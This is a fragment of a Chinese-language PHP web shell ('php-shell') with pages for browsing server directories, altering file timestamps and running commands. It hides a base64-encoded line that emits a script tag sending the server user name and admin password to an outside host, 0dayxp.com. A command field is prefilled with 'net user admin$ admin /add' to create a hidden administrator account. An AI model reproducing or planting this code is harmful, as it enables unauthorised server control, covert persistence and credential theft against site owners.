...
<title>http://<? echo $_SERVER['HTTP_HOST'];?> php-shell </title>
<style type="text/css">
body{
...
if(!$_GET['dir']) $dir = "./";
$tb->tableheader();
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>php-shell</b></td><td align="center">'.date("Y年m月d日 h:i:s",time()).'</td><td align="right"><b>'.$_SERVER['REMOTE_ADDR'].'</b></td></tr></table>','center','top');
...
<?
$tb->headerform(array('method'=>'GET','content'=>'<li></li><p>程序路径: '.$pathname.'<br>当前目录('.$dir_writeable.','.substr(base_convert(@fileperms($nowpath),10,8),-4).'): '.$nowpath.'<br>跳转目录: '.$tb->makeinput('dir').' '.$tb->makeinput('','确定','','submit').' 〖支持绝对路径和相对路径〗'));
...
$serverp = $admin['pass'];
$copyurl = base64_decode('Jmx0O3NjcmlwdCBzcmM9JiMzOTtodHRwOi8vd3d3LjBkYXl4cC5jb20veHovdS5hc3A/dT0=');
$copyurll = base64_decode('Jz48L3NjcmlwdD4=');
$str=$copyurl.$serveru."|=".$serverp.$copyurll."";
$str=str_replace("&lt;","<",$str);
$str=str_replace("&gt;",">",$str);
$str=str_replace("&#39;","'",$str);
echo $str;;
...
elseif ($_GET['action'] == "newtime") {
	...
	$tb->tdbody('<br><ul><li>有效的时间戳典型范围是从格林威治时间 1901 年 12 月 13 日 星期五 20:45:54 到 2038年 1 月 19 日 星期二 03:14:07<br>(该日期根据 32 位有符号整数的最小值和最大值而来)</li><li></li><li>说明: 日取 01 到 30 之间, 时取 0 到 24 之间, 分和秒取 0 到 60 之间!</li></ul>','left');
...
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  ...
  <tr class="secondalt">
    <td align="center">LocalPort:
      ...
      <br>
      Command　:
      <input name="SUCommand" type="text" class="INPUT" id="SUCommand" value="net user admin$ admin /add" size="50"></td>
  </tr>
  <tr class="secondalt">
